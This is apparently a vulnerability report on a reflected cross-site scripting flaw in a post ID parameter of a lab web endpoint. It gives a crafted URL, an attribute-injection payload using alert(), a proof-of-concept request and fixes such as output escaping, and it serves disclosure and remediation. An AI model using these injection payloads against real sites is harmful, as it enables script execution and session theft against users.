## Title
Reflected Cross-Site Scripting (XSS) in Post ID Parameter

## Summary
I identified a reflected Cross-Site Scripting (XSS) vulnerability in the post ID parameter of the following endpoint:

## Vulnerable Endpoint
https://kzlabs.com/59.php/

The application reflects user-controlled input from the post ID into the page without proper sanitization or output encoding, allowing arbitrary JavaScript execution in the victim's browser.

## Steps to Reproduce

1. Open the following crafted URL in a browser:
https://labs.krazeplanet.com/59.php/svc/shreddit/api/comments/askreddit/t3_u9po1lt3_u9po1l%20onmouseenter=alert(1)%20x=/t1_testt3_u9po1l%20onmouseenter=alert(1)%20x=

2. Click on the "See more comments" button.
3. Observe that the JavaScript alert popup appears.
4. This confirms that arbitrary JavaScript supplied through the post ID parameter is executed in the browser.

## Payload Used

t3_u9po1l%20onmouseover=alert(document.domain)%20y=

## Proof of Concept Request

http
GET /59.php/svc/shreddit/api/comments/askreddit/t3_u9po1l%20onmouseover=alert(document.domain)%20y= HTTP/1.1
Host: kzlabs.com

## Impact

- An attacker can execute arbitrary JavaScript in the victim's browser.
- Attackers may steal session information or sensitive user data.
- Malicious scripts may redirect users to phishing pages.
- An attacker may perform actions on behalf of authenticated users.
- This issue may affect users who interact with crafted malicious links.

## Recommendations for Fix

1. Sanitize and validate all user-controlled input before rendering it in the response.
2. Escape special characters such as:
   `<`, `>`, `"`, `'`, `&`
3. Avoid reflecting unsanitized input directly into HTML attributes or JavaScript contexts.
4. If using PHP, use secure functions such as:
php
htmlspecialchars($input, ENT_QUOTES, 'UTF-8');

5. Perform regular security testing for reflected and stored XSS vulnerabilities.

